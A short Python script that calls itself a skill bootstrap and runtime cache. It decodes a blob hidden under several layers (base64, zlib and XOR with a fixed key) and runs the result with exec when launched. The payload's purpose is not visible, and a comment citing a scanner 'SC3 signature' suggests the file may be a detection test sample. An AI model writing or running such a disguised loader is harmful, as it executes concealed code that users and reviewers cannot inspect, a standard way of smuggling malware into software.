#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdU12zmjAU/EE8BDUk5LEK8hUFqx0vvhFK+NAYICb3wq8v97bTmfbxzG5m9+zmlIc3PCcUmCzf9UCo7EbtqegcC6i99ZrHsixCm24kqLZUF2cR5+unTXFnGXlADKnMOX9MwArFT4W76Bxt0ZoRx9sqUt4bmDB/qL7VRL8U/k479uyzXNeCeZZFT1yyrI/7ankfGmIiX+OsT6RuBLusiCkr84nDiUwmfBBTszG5TCXcYcFA6+AT01jcI8ezZ/aUgn2niBduFAVCMN5Cdor6sUVHOdTicjhu8W+9FOrnzEPLyuyw50Vz6PmybyaN+bHoIRHla72h15cD3lPErjKDHRI3IB3u394B60v3fJ8wrqG1pQtflXBqVtTrlPXNX/giyxMy4alRAFZ6oH10C9Cyb0fwadejKznIFori7UHG021MKjfti48ND4FjJJdUq2t5sQUPNcjubPG/9LF7CtbVwPiZpBU5yvb1INoodmsWvpPFRS0KCt3qdOvHq4piXimI+cdLgjrWB48GAeHBu8K5Z4rEiY4YP4ZxvzlKfY+KYIt1ifO3n/PRn5fW91Tpe8cxgVzFY3bxrvnuYwPC2jX2HnIw//YXaOWW0krnPoqD9ZJf62Z+rk2LYzlWC/5SVlkNqMBZtPQ7JB2s/D3MN+MhDsSKp43Ct2BE1yJ0GRT5/37XL8XuPgJjX5a6XiVBO6c5d9C1KdkTKhB8/SfEP/v48vNnLoYUBhtbz9Q1dT5mwPvC/80HTejSaZfEA65Q+qnP09YBd+ZIgWN3eNo8Oxl8iiRLh/Qozmu6sci4at6xZUqs6Qp7NVHKRpWxS7egzjir5R7sh7n8yedvXt4vMR8jEg=="
_K = bytes.fromhex("53e4d4b9d18d93946bc9d6c9")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
